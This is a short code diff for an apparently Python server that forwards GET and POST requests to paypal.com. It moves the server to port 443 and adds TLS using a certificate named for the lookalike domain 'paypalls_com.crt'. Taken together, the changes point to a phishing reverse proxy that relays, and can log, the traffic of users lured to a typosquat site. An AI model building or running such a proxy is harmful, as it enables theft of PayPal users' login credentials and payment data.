@@ -6,7 +6,7 @@ from express import http_manager
 import re
 
 host="0.0.0.0"
-port=5000
+port=443
 
 domain_routes={
 	"domain":"https://www.paypal.com",
@@ -95,7 +95,6 @@ def ip_formatter(ip_address_tuple):
 	return str([ip_address_tuple[0]])
 
 def get(req,res):
-	print('get request')
 	query=req['query']
 	url=domain_routes['domain'] + query
 	print('url:',url)
@@ -125,4 +124,4 @@ def post(req,res):
 
 express.get(get)
 express.post(post)
-express.serve(host,port)
+express.serve(host,port,{'key':'./ssl/domain.key','certificate':'./ssl/paypalls_com.crt'})
